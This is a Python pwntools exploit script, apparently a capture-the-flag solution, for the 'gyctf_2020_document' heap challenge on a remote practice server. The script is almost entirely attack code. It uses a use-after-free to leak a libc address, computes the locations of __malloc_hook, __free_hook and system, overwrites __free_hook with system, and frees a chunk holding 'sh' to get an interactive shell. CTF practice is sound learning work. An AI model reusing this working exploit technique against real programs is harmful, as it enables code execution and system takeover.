# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
#context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './gyctf_2020_document'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25982'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def bgdb(fun):
    gdb.attach(p,'b %s'%fun)

def cmd(num):
    sla('choice :',num)

def add(name,sex,text):
    cmd(1)
    sa("name",name)
    sa("sex",sex)
    sa("nformation",text)

def delete(id):
    cmd(4)
    sla("index : ",id)

def show(id):
    cmd(2)
    sla("index : ",id)

def edit(id,text):
    cmd(3)
    sla("index : ",id)
    sla("sex?","Y")
    sa("information",text)

#释放0x90大小的块，后再申请会先申请0x20大小的块，之后就可以对0x20大小的块进行控制

add("niyahnia","w","a"*0x70)
add("sh".ljust(8,"\x00"),"w","a"*0x70)

delete(0)

show(0)

__malloc_hook = l64() - 0x68
libc.address = __malloc_hook -libc.sym["__malloc_hook"]
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

lg("free_hook",free_hook)

add("galatea\x00","w","b"*0x70)
add("galatea\x00","w","b"*0x70)

payload = p64(0) + p64(0x21) + p64(free_hook-0x10) + p64(1)*2 + p64(0x51) + p64(__malloc_hook + 0x68)*2

edit(0, payload.ljust(0x70,"\x00"))
edit(3, p64(system).ljust(0x70,"\x00") )

#dbg()
delete(1)

p.interactive()

'''
@File    :   gyctf_2020_document.py
@Time    :   2021/07/21 12:38:47
@Author  :   Niyah 
'''